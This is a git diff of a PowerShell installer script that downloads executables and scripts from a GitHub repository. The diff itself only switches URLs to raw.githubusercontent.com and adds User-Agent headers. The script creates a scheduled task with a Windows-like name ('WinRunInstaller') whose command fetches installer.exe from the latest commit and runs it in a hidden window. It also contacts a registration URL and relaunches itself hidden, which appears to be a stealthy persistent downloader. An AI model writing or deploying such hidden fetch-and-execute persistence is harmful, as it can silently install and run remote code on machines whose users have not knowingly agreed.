@@ -39,9 +39,12 @@ Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 New-Item -ItemType Directory -Path $runDir -Force | Out-Null
 
+$ghHeaders = @{ "User-Agent" = "PowerShell-Installer" }
+
 try {
 	$apiResponse = Invoke-RestMethod `
 		-Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" `
+		-Headers $ghHeaders `
 		-UseBasicParsing `
 		-ErrorAction Stop
 
@@ -53,8 +56,9 @@ catch {
 
 try {
 	Invoke-WebRequest `
-		-Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" `
+		-Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/run.exe" `
 		-OutFile $runExe `
+		-Headers $ghHeaders `
 		-UseBasicParsing `
 		-ErrorAction Stop
 }
@@ -64,8 +68,9 @@ catch {
 
 try {
 	Invoke-WebRequest `
-		-Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_installer.ps1" `
+		-Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_installer.ps1" `
 		-OutFile $installer `
+		-Headers $ghHeaders `
 		-UseBasicParsing `
 		-ErrorAction Stop
 }
@@ -75,8 +80,9 @@ catch {
 
 try {
 	Invoke-WebRequest `
-		-Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/frames_dev/ss_control.ps1" `
+		-Uri "https://raw.githubusercontent.com/yuan-miranda/run/$latestCommit/frames_dev/ss_control.ps1" `
 		-OutFile $ssControl `
+		-Headers $ghHeaders `
 		-UseBasicParsing `
 		-ErrorAction Stop
 }
@@ -103,7 +109,7 @@ $settings = New-ScheduledTaskSettingsSet `
 	-DontStopIfGoingOnBatteries `
 	-ExecutionTimeLimit (New-TimeSpan -Days 365)
 
-$cmd = 'powershell.exe -Command "$p="$env:APPDATA\run"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'').sha; $o="$p\installer.exe"; Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o; Start-Process -FilePath $o -WindowStyle Hidden"'
+$cmd = 'powershell.exe -Command "$p="$env:APPDATA\run"; if (!(Test-Path $p)) { New-Item -ItemType Directory -Path $p }; $h=@{''User-Agent''=''PowerShell-Updater''}; $sha=(Invoke-RestMethod ''https://api.github.com/repos/yuan-miranda/run/commits/main'' -Headers $h).sha; $o="$p\installer.exe"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yuan-miranda/run/$sha/installer.exe" -OutFile $o -Headers $h -UseBasicParsing; Start-Process -FilePath $o -WindowStyle Hidden"'
 
 $installerTaskName = "WinRunInstaller"
 $installerAction = New-ScheduledTaskAction `
@@ -167,6 +173,7 @@ try {
 	Invoke-RestMethod `
 		-Method Get `
 		-Uri $registerUrl `
+		-Headers $ghHeaders `
 		-ErrorAction Stop | Out-Null
 }
 catch {
@@ -200,3 +207,4 @@ if ($self) {
 	) `
 		-WindowStyle Hidden
 }
+
